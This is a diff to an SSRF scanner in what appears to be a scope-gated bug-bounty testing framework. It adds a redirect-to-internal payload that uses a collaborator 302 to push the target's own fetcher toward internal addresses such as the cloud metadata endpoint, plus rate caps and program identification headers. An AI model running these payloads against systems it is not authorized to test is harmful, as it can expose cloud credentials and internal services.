@@ -51,9 +51,11 @@ Honest limits (docstring is the contract):
   - The probe is unauthenticated single-vector; authed SSRF surfaces and
     multi-step triggers need manual ``zap_send_raw`` drill-down.
   - Redirect-to-internal (a collaborator endpoint that 302s to 169.254.x)
-    is NOT in the battery — the current collaborator returns 200 OK, not a
-    redirect. Noted as a future enhancement; add a redirect path to the
-    collaborator to unlock it.
+    is included ONLY when ``redirect_to`` is passed AND a collaborator with
+    the token-gated ``/r/<id>?to=<url>`` endpoint is running (lab listener
+    or COLLAB_PUBLIC_URL funnel mode). Pass e.g.
+    ``http://169.254.169.254/latest/meta-data/`` to have the target follow
+    our 302 into its own internal space.
   - Network timing over a VPN/lab link is noisy; timing flags are advisory.
 """
 
@@ -217,19 +219,45 @@ def _try_collab() -> Optional[Any]:
         return None
 
 
+def _scan_config() -> Tuple[Dict[str, str], Optional[float]]:
+    """Program-mandated identification headers + rate cap (no args).
+
+    Resolves from the operator-ARMED scope state via
+    ``program_scope.get_armed_scan_config`` (the enforcement-by-code backstop
+    ffuf/ZAP get via explicit scope_handle). Falls back to our own
+    identifying UA when nothing is armed / no manifest is cached.
+    """
+    try:
+        from auxiliaries.program_scope import get_armed_scan_config
+        cfg = get_armed_scan_config() or {}
+    except Exception:
+        cfg = {}
+    headers = dict(cfg.get("headers") or {})
+    headers.setdefault("User-Agent", "framework-ssrfprobe/1.0")
+    rate = cfg.get("max_requests_per_second")
+    try:
+        rate = float(rate) if rate and float(rate) > 0 else None
+    except (TypeError, ValueError):
+        rate = None
+    return headers, rate
+
+
 # --- the tool ---------------------------------------------------------------
 
 @framework_tool(
     "SSRF scanner: substitute a canonical payload battery (OOB/collaborator, "
-    "localhost, internal RFC1918 + cloud metadata, scheme bypasses) into a "
+    "localhost, internal RFC1918 + cloud metadata, scheme bypasses, optional "
+    "redirect-to-internal via the collaborator's /r/ 302 endpoint) into a "
     "target URL/param and grade responses + out-of-band callbacks. Blind "
     "SSRF is confirmed by a collaborator callback; in-band metadata/file "
     "reflection and fetch-error strings are surfaced with severity hints; "
     "status/length/timing anomalies are flagged LOW (inferential). Scope-"
     "gated on the target endpoint (payload values are intentionally not "
-    "gated — they are what the server fetches, not our traffic). Start "
-    "collab_start first for blind detection. Pair with zap_send_raw for "
-    "authed/multi-step drill-down.",
+    "gated — they are what the server fetches, not our traffic). Program "
+    "identification headers (e.g. X-HackerOne-Research) and rate caps from "
+    "the armed program scope are auto-applied. Start collab_start first for "
+    "blind detection; pass redirect_to= to unlock redirect-to-internal. "
+    "Pair with zap_send_raw for authed/multi-step drill-down.",
     next_hints=["collab_poll", "collab_generate", "zap_send_raw", "report_finding"],
 )
 def scan_ssrf(
@@ -238,9 +266,11 @@ def scan_ssrf(
     method: str = "GET",
     body: str = "",
     collab_id: str = "",
+    redirect_to: str = "",
     insecure: bool = False,
     timeout: float = _PER_PAYLOAD_TIMEOUT,
     max_payloads: int = _MAX_PAYLOADS,
+    delay: float = 0.0,
 ) -> Dict[str, Any]:
     """Probe ``target`` for SSRF across the payload battery.
 
@@ -257,12 +287,27 @@ def scan_ssrf(
             ``collab_generate``). If omitted and the collaborator is
             running, one is generated automatically; if the collaborator is
             not running, blind payloads are skipped (noted in the envelope).
+        redirect_to: Optional internal URL for the redirect-to-internal
+            battery (e.g. ``http://169.254.169.254/latest/meta-data/``).
+            Adds one blind payload through the collaborator's token-gated
+            ``/r/<id>?to=<url>`` 302 endpoint — the target fetches our URL,
+            we 302 it to ``redirect_to``, its fetcher follows (if it follows
+            redirects) into its own internal space. Needs a running
+            collaborator (lab or COLLAB_PUBLIC_URL public mode).
         insecure: Skip TLS verification (self-signed lab certs).
         timeout: Per-payload request timeout in seconds.
         max_payloads: Cap on total payloads sent (default 40).
+        delay: Extra seconds between payload requests (politeness knob).
+            A program-mandated max-requests-per-second from the armed
+            program scope is honoured automatically (the larger of the two
+            wins). Requests are serial regardless.
     """
     from utils.scope_gate import check_scan, ScopeGateError
     from utils.gated_http import gated_request
+
+    scan_headers, scan_rps = _scan_config()
+    eff_delay = max(0.0, float(delay or 0.0),
+                    (1.0 / scan_rps) if scan_rps else 0.0)
 
     target = (target or "").strip()
     method = (method or "GET").upper()
@@ -297,6 +342,7 @@ def scan_ssrf(
     # to the exact payload.  collab_poll filters by substring on the base id,
     # so both sub-ids' callbacks are returned together.
     collab_domain = ""
+    collab_public_base = ""
     if collab is not None:
         if not collab_id:
             try:
@@ -304,21 +350,42 @@ def scan_ssrf(
                 gen = collab.collab_generate()
                 gen = _json.loads(gen) if isinstance(gen, str) else gen
                 collab_id = gen["id"]
-                collab_domain = gen.get("dns_name", "").split(".", 1)[1] \
-                    if "." in gen.get("dns_name", "") else "oob.lab"
+                if gen.get("mode") == "public":
+                    collab_public_base = (gen.get("base") or "").rstrip("/")
+                else:
+                    collab_domain = gen.get("dns_name", "").split(".", 1)[1] \
+                        if "." in gen.get("dns_name", "") else "oob.lab"
             except Exception:
                 collab = None
         else:
             collab_domain = "oob.lab"
     if collab is not None and collab_id:
-        if not collab_domain:
-            collab_domain = "oob.lab"
         sub_http = f"{collab_id}h"
         sub_dns = f"{collab_id}d"
-        for pid, url in ((sub_http, f"http://{sub_http}.{collab_domain}/ssrf"),
-                         (sub_dns, f"http://{sub_dns}.{collab_domain}/")):
+        if collab_public_base:
+            # Public (funnel) mode: single public host, path-based ids.
+            blind: Tuple[Tuple[str, str], ...] = (
+                (sub_http, f"{collab_public_base}/c/{sub_http}/"),
+                (sub_dns, f"{collab_public_base}/c/{sub_dns}/"),
+            )
+        else:
+            if not collab_domain:
+                collab_domain = "oob.lab"
+            blind = (
+                (sub_http, f"http://{sub_http}.{collab_domain}/ssrf"),
+                (sub_dns, f"http://{sub_dns}.{collab_domain}/"),
+            )
+        for pid, url in blind:
             _add("blind", url, pid=pid)
             blind_payloads.append((pid, url))
+        if redirect_to:
+            rid = f"{collab_id}r"
+            r_url = (f"{collab_public_base}/r/{rid}?to={urlencode({'to': redirect_to})}"
+                     if collab_public_base else
+                     f"http://{rid}.{collab_domain or 'oob.lab'}/r/{rid}"
+                     f"?to={urlencode({'to': redirect_to})}")
+            _add("redirect_oob", r_url, pid=rid)
+            blind_payloads.append((rid, r_url))
     collab_unavailable = collab is None
 
     for v in _LOCALHOST_PAYLOADS:
@@ -339,7 +406,7 @@ def scan_ssrf(
         b_resp, _h = gated_request(
             method, b_url, data=b_data, json=b_json, verify=not insecure,
             timeout=(5.0, timeout), allow_redirects=False,
-            headers={"User-Agent": "framework-ssrfprobe/1.0"},
+            headers=scan_headers,
         )
         baseline_sig = _signature(b_resp, time.time() - t0, "")
     except ScopeGateError:
@@ -350,7 +417,9 @@ def scan_ssrf(
     # Fire each payload.
     results: List[Dict[str, Any]] = []
     last_sent_ts = 0.0
-    for p in payloads:
+    for i, p in enumerate(payloads):
+        if eff_delay > 0 and i > 0:
+            time.sleep(eff_delay)
         f_url, f_data, f_json = _inject(target, p["value"], param or None,
                                         method, body or None)
         t0 = time.time()
@@ -358,7 +427,7 @@ def scan_ssrf(
             resp, _h = gated_request(
                 method, f_url, data=f_data, json=f_json, verify=not insecure,
                 timeout=(5.0, timeout), allow_redirects=False,
-                headers={"User-Agent": "framework-ssrfprobe/1.0"},
+                headers=scan_headers,
             )
             sig = _signature(resp, time.time() - t0, "")
             body_txt = resp.text[:65536] if resp.encoding is not None or resp.content else ""
@@ -474,6 +543,9 @@ def scan_ssrf(
         "baseline": baseline_sig,
         "collab_id": collab_id,
         "collab_available": not collab_unavailable,
+        "scan_headers_applied": sorted(
+            h for h in scan_headers if h.lower() != "user-agent"),
+        "rate_cap_rps": scan_rps,
         "payloads_sent": len(results),
         "blind_hits": blind_hits,
         "results": results,
@@ -486,7 +558,10 @@ def scan_ssrf(
             "Blind callback = the only hard confirmation. Reflection/secret "
             "hits are strong but confirm the real endpoint. Anomaly/error "
             "flags are inferential — confirm with zap_send_raw. "
-            "Redirect-to-internal payloads are not included (collaborator "
-            "has no redirect endpoint yet)."
+            + ("Redirect-to-internal payload included via the collaborator "
+               "/r/ endpoint (redirect_to was passed)."
+               if redirect_to else
+               "Redirect-to-internal payloads are only included when "
+               "redirect_to is passed (collaborator /r/ endpoint).")
         ),
     }
